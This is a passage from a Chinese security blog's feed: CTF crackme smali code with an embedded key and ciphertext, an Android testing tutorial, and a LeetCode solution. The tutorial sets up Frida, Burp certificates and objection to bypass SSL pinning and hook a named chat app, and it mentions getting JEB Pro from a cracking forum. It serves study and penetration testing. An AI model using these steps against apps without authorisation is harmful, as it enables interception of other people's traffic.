class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span></span><br><span class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></span><br><span class="line"><span class="keyword">.source</span> <span class="string">"Crackme.java"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># instance fields</span></span><br><span class="line"><span class="keyword">.field</span><span class="keyword"> private</span> str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># direct methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 22</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 21</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iput-object </span>v0, p0, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 23</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0, v0&#125;, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;GetFlag(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 24</span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> private</span> GetFlag(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 4</span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"str"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v3, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 27</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p1&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2, v3&#125;, <span class="class">Landroid/util/Base64;</span>-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 29</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"content"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v1, <span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iget-object </span>v2, p0, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2, v3&#125;, <span class="class">Landroid/util/Base64;</span>-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;&lt;init&gt;([B)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 30</span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">"kk"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> sget-object </span>v2, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0, v0, v1&#125;, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;decrypt([B<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v2, v3&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 31</span><br><span class="line">   <span class="built_in"> const/4 </span>v2, 0x0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-object </span>v2</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> private</span> decrypt([B<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 8</span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"content"</span>    <span class="comment"># [B</span></span><br><span class="line"><span class="keyword">    .param</span> p2, <span class="string">"password"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 35</span><br><span class="line">   <span class="built_in"> const/4 </span>v4, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 37</span><br><span class="line"><span class="keyword">    .local</span> v4, <span class="string">"m"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="keyword"> :try_start_0</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 38</span><br><span class="line"><span class="keyword">    .local</span> v3, <span class="string">"keyStr"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v2, <span class="class">Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v7, <span class="string">"AES"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v2, v3, v7&#125;, <span class="class">Ljavax/crypto/spec/SecretKeySpec;</span>-&gt;&lt;init&gt;([B<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 39</span><br><span class="line"><span class="keyword">    .local</span> v2, <span class="string">"key"</span>:<span class="class">Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line">   <span class="built_in"> const-string </span>v7, <span class="string">"AES/ECB/NoPadding"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v7&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;getInstance(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljavax/crypto/Cipher;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 40</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"cipher"</span>:<span class="class">Ljavax/crypto/Cipher;</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v7, 0x2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, v7, v2&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;init(I<span class="class">Ljava/security/Key;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 41</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, p1&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;doFinal([B)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v6</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 42</span><br><span class="line"><span class="keyword">    .local</span> v6, <span class="string">"result"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v5, <span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v5, v6&#125;, <span class="class">Ljava/lang/String;</span>-&gt;&lt;init&gt;([B)V</span><br><span class="line">   <span class="keyword"> :try_end_0</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljava/security/NoSuchAlgorithmException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_1</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/NoSuchPaddingException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_0</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljava/security/InvalidKeyException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_4</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/IllegalBlockSizeException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_2</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/BadPaddingException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .end local</span> v4    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .local</span> v5, <span class="string">"m"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> move-object </span>v4, v5</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 46</span><br><span class="line"><span class="keyword">    .end local</span> v0    <span class="comment"># "cipher":Ljavax/crypto/Cipher;</span></span><br><span class="line"><span class="keyword">    .end local</span> v2    <span class="comment"># "key":Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line"><span class="keyword">    .end local</span> v3    <span class="comment"># "keyStr":[B</span></span><br><span class="line"><span class="keyword">    .end local</span> v5    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .end local</span> v6    <span class="comment"># "result":[B</span></span><br><span class="line"><span class="keyword">    .restart</span> local v4    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line">   <span class="keyword"> :goto_0</span></span><br><span class="line">   <span class="built_in"> return-object </span>v4</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 43</span><br><span class="line">   <span class="keyword"> :catch_0</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 44</span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">"e"</span>:<span class="class">Ljava/security/GeneralSecurityException;</span></span><br><span class="line">   <span class="keyword"> :goto_1</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/security/GeneralSecurityException;</span>-&gt;printStackTrace()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 43</span><br><span class="line"><span class="keyword">    .end local</span> v1    <span class="comment"># "e":Ljava/security/GeneralSecurityException;</span></span><br><span class="line">   <span class="keyword"> :catch_1</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_2</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_3</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_4</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure><h2><span id="java类">JAVA类</span></h2><ul><li>perform(function) 执行函数</li><li>Java.use(className)  获取类名</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;此篇文章主要讲的是android中使用frida框架hook应用进程。&lt;/p&gt;
    
    </summary>
    
    
      <category term="android测试" scheme="http://blog.ydq6.com/categories/android%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Frida" scheme="http://blog.ydq6.com/tags/Frida/"/>
    
  </entry>
  
  <entry>
    <title>安卓测试(一)</title>
    <link href="http://blog.ydq6.com/android/%E5%AE%89%E5%8D%93%E6%B5%8B%E8%AF%95-%E4%B8%80/"/>
    <id>http://blog.ydq6.com/android/%E5%AE%89%E5%8D%93%E6%B5%8B%E8%AF%95-%E4%B8%80/</id>
    <published>2020-06-07T07:51:13.000Z</published>
    <updated>2020-06-22T15:25:47.749Z</updated>
    
    <content type="html"><![CDATA[<p>因为很多时候测试涉及到小程序和app的测试，而测试过程中可能遇到一些阻隔，所以开始学习android测试。</p><a id="more"></a><h1><span id="hook工具环境安装">hook工具环境安装</span></h1><p>用到工具</p><ul><li>夜深模拟器</li><li>adb</li></ul><h2><span id="首先用adb调试夜神模拟器">首先用adb调试夜神模拟器。</span></h2><p>先查看adb版本：</p><p><img src="/assets/image-20200607155844624.png" alt="image-20200607155844624"></p><p>然后找到夜深浏览器所在目录，使用nox_adb.exe查看版本：</p><p>[注]如何快速查找这两个工具所在位置用utool就可以。</p><p><img src="/assets/image-20200607160116200.png" alt="image-20200607160116200"></p><p>发现两个工具版本不一样。</p><p>如果直接运行adb devices是不成功的。</p><p><img src="/assets/image-20200607160225606.png" alt="image-20200607160225606"></p><p>现在将nox_adb.exe改为nox_adb_bak.exe</p><p>然后把adb.exe拷贝到夜神模拟器所在路径并改名为nox_adb.exe</p><p><img src="/assets/image-20200607160725005.png" alt="image-20200607160725005"></p><p>再次执行发现还是</p><p><img src="/assets/image-20200607160909672.png" alt="image-20200607160909672"></p><p>然后发现夜神由于打游戏用的平板模式，换成手机模式就好了：</p><p><img src="/assets/image-20200607161207168.png" alt="image-20200607161207168"></p><h2><span id="手机burp证书安装">手机burp证书安装</span></h2><p>（1）burp导出证书并修改后缀名为.cer</p><p>（2）adb push 证书路径 /mnt/sdcard/gwolfs/cacert.cer</p><p>（3）在手机上安装证书。</p><p>设置-安全-从SD卡安装证书</p><p>（4）配置代理</p><p>[注]</p><ul><li>安卓文件系统的默认路径是：</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/storage/</span>emulated<span class="regexp">/0/</span></span><br></pre></td></tr></table></figure><p>但是该路径是read-only的。</p><ul><li>adb shell 后面可以执行linux系统命令</li></ul><p><img src="/assets/image-20200607162415591.png" alt="image-20200607162415591"></p><p><img src="/assets/image-20200607162613685.png" alt="image-20200607162613685"></p><p><img src="/assets/image-20200607163557925.png" alt="image-20200607163557925"></p><p><img src="/assets/image-20200607170223141.png" alt="image-20200607170223141"></p><p><img src="/assets/image-20200607170238703.png" alt="image-20200607170238703"></p><p><img src="/assets/image-20200607170759437.png" alt="image-20200607170759437"></p><h2><span id="安装frida">安装Frida</span></h2><p>(1)pip install frida</p><p>(2)github下载frida-server</p><p>(3)adb push放入手机目录里</p><p><img src="/assets/image-20200607171032384.png" alt="image-20200607171032384"></p><p>（4）chmod 777 赋予赋予执行权限</p><p><img src="/assets/image-20200607171427354.png" alt="image-20200607171427354"></p><p>（5）启动frida-server服务器</p><p><img src="/assets/image-20200607171513728.png" alt="image-20200607171513728"></p><p>发现不对。想了想CPU架构有问题，夜神模拟器底层的CPU是基于本机的，是intel的，不是arm的，所以换成x86的导入即可。</p><p><img src="/assets/image-20200607171823766.png" alt="image-20200607171823766"></p><p>（6）在windows上使用<code>firda-ps -U</code>列出所有进程</p><p><img src="/assets/image-20200607171938655.png" alt="image-20200607171938655"></p><p>成功列出，环境搭建成功。</p><h2><span id="安装xposed">安装Xposed</span></h2><p>下载xposed安装apk</p><p>android5.0以下：</p><p><a href="https://repo.xposed.info/module/de.robv.android.xposed.installer" target="_blank" rel="noopener">https://repo.xposed.info/module/de.robv.android.xposed.installer</a></p><p>android5.0以上：</p><p><a href="https://forum.xda-developers.com/showthread.php?t=3034811" target="_blank" rel="noopener">https://forum.xda-developers.com/showthread.php?t=3034811</a></p><p>注意安装xposed需要root权限。</p><p>安装apk后发现</p><p><img src="/assets/image-20200609224324994.png" alt="image-20200609224324994"></p><p>点击下面的安装，下载完成后安装成功。</p><p><img src="/assets/image-20200609225733881.png" alt="image-20200609225733881"></p><h4><span id="真机安装">真机安装</span></h4><h1><span id="app抓包">App抓包</span></h1><h2><span id="ssl-pinning">SSL pinning</span></h2><h2><span id="绕过证书锁定">绕过证书锁定</span></h2><p>注意一点，当前frida-server不是以后台服务启动的，需要加个&amp;作为后台服务启动</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frida-server<span class="meta">&amp;</span></span><br></pre></td></tr></table></figure><p>先前说到，利用<code>frida-ps -U</code>可以列举出模拟器中的所有进程。</p><p>绕过证书锁定的原理是注入进程。所以可以根据列举进程命令找到需要注入的进程ID和名字，然后使用frida进行注入。</p><p>（1）首先模拟器上打开app。</p><p>（2）查看进程</p><p><img src="/assets/image-20200607190745464.png" alt="image-20200607190745464"></p><p>发现两个进程号。</p><p>注意frida写python脚本时：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">get_remote_device</span><span class="params">()</span></span>   <span class="comment">//模拟器使用这个</span></span><br><span class="line"><span class="function"><span class="title">get_usb_device</span><span class="params">()</span></span>    <span class="comment">//usb设备用这个</span></span><br></pre></td></tr></table></figure><p>绕过脚本来源：<a href="https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/" target="_blank" rel="noopener">https://techblog.mediaservice.net/2017/07/universal-android-ssl-pinning-bypass-with-frida/</a></p><p>因为脚本中会用到burp证书，所以先把burp证书复制到与frida-server一个目录下。</p><p><img src="/assets/image-20200607180032085.png" alt="image-20200607180032085"></p><p>然后执行脚本：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">frida</span> <span class="selector-tag">-U</span> <span class="selector-tag">-f</span> <span class="selector-tag">com</span><span class="selector-class">.feiliao</span><span class="selector-class">.flipchat</span><span class="selector-class">.android</span> <span class="selector-tag">-l</span> <span class="selector-tag">frida-android-repinning</span><span class="selector-class">.js</span> <span class="selector-tag">--no-pause</span></span><br></pre></td></tr></table></figure><p>成功注入：</p><p><img src="/assets/image-20200607190844347.png" alt="image-20200607190844347"></p><p>不知道为什么爆红了，但实际抓包成功。</p><p><img src="/assets/image-20200607191013245.png" alt="image-20200607191013245"></p><h2><span id="objection">Objection</span></h2><p>发现objection工具自动的可以绕过。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install objection</span><br></pre></td></tr></table></figure><h3><span id="方法一-动态交互式界面hook">方法一 动态交互式界面hook</span></h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">objection</span> <span class="selector-tag">-g</span> <span class="selector-tag">com</span><span class="selector-class">.feiliao</span><span class="selector-class">.flipchat</span><span class="selector-class">.android</span> <span class="selector-tag">explore</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200607191337324.png" alt="image-20200607191337324"></p><ul><li><p>环境变量</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">env</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="/assets/image-20200607191439337.png" alt="image-20200607191439337"></p><ul><li>列举出所有activity.</li></ul><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list activities        #还支持列举<span class="class"><span class="keyword">class</span>,<span class="type">services。</span></span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200607203150653.png" alt="image-20200607203150653"></p><ul><li>memory管理</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">memory</span> <span class="keyword">list</span> modules       查看当前进程的内存情况</span><br><span class="line"><span class="keyword">memory</span> <span class="keyword">search</span> --string --offsets-only  搜索内存</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200607203457762.png" alt="image-20200607203457762"></p><ul><li>hook方式</li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">android </span>hooking watch class_method 包名.类名.方法名</span><br><span class="line"><span class="keyword">android </span>hooking watch class 包名.类名</span><br></pre></td></tr></table></figure><ul><li>执行命令行命令</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">android</span> shell_exec<span class="meta"> [command]</span></span><br><span class="line">[command]</span><br></pre></td></tr></table></figure><ul><li>下载文件</li></ul><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">file</span> download 目标文件 存放地址</span><br></pre></td></tr></table></figure><ul><li>启动activies/services</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">android <span class="built_in">int</span>ent lanuch_activity [活动名]</span><br><span class="line">android <span class="built_in">int</span>ent launch_service [类名]</span><br></pre></td></tr></table></figure><ul><li>绕过 sslpinning </li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">android </span>sslpinning disable</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200607205622609.png" alt="image-20200607205622609"></p><h3><span id="方法二-重新打包apk">方法二 重新打包apk</span></h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection patchapk <span class="comment">--source app-release.apk</span></span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200607205914084.png" alt="image-20200607205914084"></p><p>objection 出现Timeout Error</p><p>网上也不建议采用这种方式注入。</p><h1><span id="逆向工具安装">逆向工具安装</span></h1><h2><span id="jeb">JEB</span></h2><p>JEB是类似于IDA的android逆向工具，从吾爱破解爱盘3.0下载pro版本的即可。免安装。</p><p>测试：<br><img src="/assets/image-20200608102044844.png" alt="image-20200608102044844"></p><p>可以看出会apk文件包含资源文件和字节码，JEB可以分析字节码并点击解析可以逆向为android文件。</p><h2><span id="apktool">Apktool</span></h2><p>下载是个jar包，利用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">apktool</span><span class="selector-class">.jar</span> <span class="selector-tag">d</span> 目标文件</span><br></pre></td></tr></table></figure><p>即可反汇编。</p><h2><span id="jadx">Jadx</span></h2><p>有gui和图形界面，直接使用即可。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为很多时候测试涉及到小程序和app的测试，而测试过程中可能遇到一些阻隔，所以开始学习android测试。&lt;/p&gt;
    
    </summary>
    
    
      <category term="android" scheme="http://blog.ydq6.com/categories/android/"/>
    
    
      <category term="android" scheme="http://blog.ydq6.com/tags/android/"/>
    
      <category term="逆向" scheme="http://blog.ydq6.com/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>Leetcode128-最长连续序列</title>
    <link href="http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode128-%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%BA%8F%E5%88%97/"/>
    <id>http://blog.ydq6.com/%E7%AE%97%E6%B3%95/Leetcode128-%E6%9C%80%E9%95%BF%E8%BF%9E%E7%BB%AD%E5%BA%8F%E5%88%97/</id>
    <published>2020-06-06T00:52:08.000Z</published>
    <updated>2020-06-06T05:32:26.283Z</updated>
    
    <content type="html"><![CDATA[<p>给定一个未排序的整数数组，找出最长连续序列的长度。</p><p>要求算法的时间复杂度为 O(n)。</p><p>示例:</p><p>输入: [100, 4, 200, 1, 3, 2]<br>输出: 4<br>解释: 最长连续序列是 [1, 2, 3, 4]。它的长度为 4。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/longest-consecutive-sequence" target="_blank" rel="noopener">https://leetcode-cn.com/problems/longest-consecutive-sequence</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p><a id="more"></a><h2><span id="方法一-插入排序算法">方法一、插入排序算法。</span></h2><p>首先插入排序，然后扫描一遍，求出最大连续长度。时间复杂度o(n^2)，空间复杂度o(n)</p><h2><span id="方法二-内外循环判断法">方法二、内外循环判断法</span></h2><p>外层循环为从开始扫描到终点。</p><p>内层循环为对每一个数num,扫描整个数组看num-1是否存在。</p><p>如果num-1不存在，则找到num+1,num+2,…一直找到num+n。</p><p>如果num-1存在，则因为num-1为连续序列的起点肯定比num好，所以不需再寻找。</p><p>这样的时间复杂度为O(n^2)</p><p>我们可以将时间复杂度降低一下，最开始用一个集合来存所有数。然后每次判断的时候判断num-1是否在集合里即可。</p><p>注意HashSet底层是HashMap，查询时间复杂度为O(1).所以整个算法的平均时间复杂度为o(n)，空间复杂度为o(n)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        HashSet&lt;Integer&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            set.add(num);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> num = nums[i];</span><br><span class="line">            <span class="keyword">if</span>(!set.contains(num-<span class="number">1</span>))&#123;</span><br><span class="line">                <span class="keyword">int</span> len = <span class="number">1</span>;</span><br><span class="line">                num = num+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(set.contains(num))&#123;</span><br><span class="line">                    num++;</span><br><span class="line">                    len++;</span><br><span class="line">                &#125;</span><br><span class="line">                maxLen = maxLen&gt;len?maxLen:len;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxLen;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200606095540690.png" alt="image-20200606095540690"></p><h2><span id="方法三-treeset方法">方法三、TreeSet方法</span></h2><p>TreeSet可以自动排序，所以可以采用TreeSet的方法。TreeSet查询时间复杂度为o(nlogn)，新增复杂度为o(nlogn)。</p><p>这样时间复杂度为o(nlogn)，空间复杂度为o(n)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 